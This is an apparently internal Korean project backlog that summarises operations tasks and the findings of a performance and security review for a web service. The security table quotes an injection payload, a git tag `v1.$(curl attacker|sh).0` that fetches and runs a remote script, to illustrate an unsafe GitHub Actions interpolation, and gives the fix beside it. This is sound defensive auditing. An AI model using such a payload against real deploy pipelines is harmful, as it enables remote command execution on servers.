# 백로그 (`docs/backlog.md` + `docs/backlog/`)

> 대응 원본: `backlog.md`(일반), `backlog/*-260711.md` 6개(2026-07-11 sql-pro/security-auditor 점검 출처)
> ← [00-index.md](./00-index.md)

## `backlog.md` — 일반 운영 백로그

우선순위 미정 / 시점 대기 항목. 착수 시 이 파일에서 지우고 이슈/PR로 전환하는 운영 규칙.

1. **이미지 기능 운영 세팅**(2026-07-03 기록, v0.5.8 배포됨) — 코드는 배포됐지만 인프라 미설정 상태라 이미지 API만 503. 필요 항목: S3 버킷 생성 / CloudFront 오리진 연결 / EC2·IAM 권한(`s3:PutObject`, `s3:HeadObject`) / S3 CORS(브라우저 직접 PUT) / `.env`의 `S3_BUCKET`·`CDN_BASE_URL`. **[08-cross-cutting-issues.md](./08-cross-cutting-issues.md) §검증에서 `.env.example` 확인 결과 여전히 미설정.**
2. **DB 백업 이중화**(2026-07-14 기록) — RDS 자동백업 retention이 Free Tier 제한으로 1일 고정(해제하려면 AWS Support 티켓 필요, 콘솔에서 불가). pg_dump→S3 이중화 방안 합의, 착수는 보류. 세부 TODO 6개(Free Tier 해제 요청, S3 버킷+lifecycle, IAM role, IMDS hop-limit 확인, RDS 엔진버전 확인, `scripts/backup_db.sh` 작성, crontab 12시간 주기)
3. **audit_log 보관정책** — 무한 증가 대응, N개월 초과분 삭제 배치. 데이터 쌓여 실측 필요해지는 시점에 착수
4. **인증 엔드포인트 rate limiting** — `/v1/auth/*`, `/v1/admin/auth/*` 요청 제한. 앱 레벨보다 리버스 프록시 레벨 우선 검토. **`backlog/auth-rate-limit-260711.md`와 사실상 동일 이슈 — 아래 참고, 중복 상세는 [08-cross-cutting-issues.md](./08-cross-cutting-issues.md) 참고**
5. **수정 이력 화면 고도화** — 이력 페이지네이션(현재 최신 100건 고정), 필드 한글라벨 API. 수요 발생 시

## `backlog/*-260711.md` — 2026-07-11 점검 출처 6건

전부 같은 날 sql-pro(성능 2건) / security-auditor(보안 4건) 점검에서 나온 항목. 각 파일에 심각도·문제·위치·수정방향·프론트영향이 통일된 포맷으로 기록돼 있다.

### 성능 2건

| 파일 | 심각도 | 문제 | 위치 | 수정 방향 | 트리거 시점 |
|---|---|---|---|---|---|
| `admin-list-scale-260711.md` | 낮음 | 어드민 목록이 매 페이지 `count(*)` 서브쿼리 별도 실행 + 선행와일드카드 `title ILIKE '%검색어%'`는 btree 못 탐(seq scan 2회) | `crud/spot.py:86-95`, `crud/spot_business_info.py:40-49` | title 검색은 `pg_trgm` GIN 인덱스. count 근사치 전환은 Refine `X-Total-Count` 계약상 트레이드오프 검토 필요 | spots 수만 건 + 어드민 목록 체감 지연 |
| `pipeline-status-index-260711.md` | 낮음 | `pipeline_status` 인덱스는 PUBLISHED partial뿐 — RAW/CURATED 등 비-PUBLISHED 필터 시 seq scan | `models/spot.py`, `crud/spot.py`(`_FILTERABLE`) | `Index("ix_spots_pipeline_status", "pipeline_status")` 추가(partial 유지) | ETL 대량 유입으로 spots 수만 건+ 또는 어드민 필터 지연 시 |

### 보안 4건

| 파일 | 심각도 | 문제 | 위치 | 수정 방향 | 프론트 영향 |
|---|---|---|---|---|---|
| `auth-rate-limit-260711.md` | 낮음 | `/v1/auth/google`, `/v1/auth/refresh`, `/v1/admin/auth/google` 무제한 요청 가능 — brute-force는 비현실적이나 Google API 호출유발/계정enumeration(401·403 응답차이)/DoS 여지 | `endpoints/auth.py:28-100`, `admin_auth.py:16` | reverse proxy(CloudFront/nginx) 레벨 rate limit 우선 검토, 어드민 로그인 실패 401/403 단일화 검토 | 없음(정상 사용 범위는 무관) |
| `deploy-tag-injection-260711.md` | 낮음(실효 낮음 — tag push 권한자 한정) | `IMAGE="${{ env.IMAGE }}"`가 SSH 스크립트에 문자열 치환 삽입 — git tag 이름에 `$`,`(`,`)` 허용되므로 악성 tag(`v1.$(curl attacker\|sh).0`) push 시 EC2 임의명령실행 가능. GitHub Actions 대표적 injection 패턴 | `.github/workflows/deploy.yml:88, 121-123` | `appleboy/ssh-action`의 `envs: IMAGE`로 환경변수 전달, 스크립트에선 `"$IMAGE"`만 참조(`${{ }}` 보간 제거) | 없음 |
| **`private-image-exposure-260711.md`** | **중간** | `GET /v1/explore/spots/{uid}/images`(비로그인)가 `is_public=False` 이미지도 presigned GET URL(1시간)로 반환 — `list_images_by_spot`에 `is_public` 필터 없음, 플래그가 접근통제 역할을 못 함 | `endpoints/explore.py:47-57`, `crud/spot_image.py` | 1) 공개 endpoint는 `is_public=True`만 반환 2) **세트 필요**: `/v1/internal/spots/{uid}/images`(전체 반환, staff 전용) 신설 — vivac-console이 공개 endpoint를 쓰고 있다면 운영자가 비공개 이미지를 못 보게 됨 | 사용자 웹: 없음(비공개 미노출이 의도된 동작) / vivac-console: internal endpoint로 전환 필요 |
| `prod-allowed-email-domain-260711.md` | 낮음(defense-in-depth 공백) | `_validate_prod_requirements`가 `ALLOWED_EMAIL_DOMAIN`을 검사 안 함 — 화이트리스트가 prod에서 조용히 꺼진 채 배포 가능(DB `is_staff` 체크가 최종방어선이라 직접우회는 아님) | `core/config.py:36`, `_validate_prod_requirements`(104-151) | prod validator에 `ALLOWED_EMAIL_DOMAIN` 필수 체크 한 줄 추가 | 없음 |
| **`sqladmin-session-cookie-260711.md`** | **중간** | SQLAdmin `SessionMiddleware` 기본값 — `https_only=False`, `max_age` 14일. `http://`로 한 번이라도 요청하면 세션쿠키 평문전송 가능하고, admin JWT(8h)보다 훨씬 긴 2주 유효 | `main.py:63-68`, `admin/auth.py` | `AdminAuth` 초기화에서 `SessionMiddleware` override — `https_only=True`, `same_site="strict"`, `max_age=8*3600`(코드 스니펫 문서에 포함) | 없음(재로그인 주기만 14일→8시간) |

## [08-cross-cutting-issues.md](./08-cross-cutting-issues.md)에서 코드 대조로 확인된 사항

- `private-image-exposure`, `prod-allowed-email-domain`, `pipeline-status-index` 3건 — **실제 코드 확인 결과 여전히 미해결.**
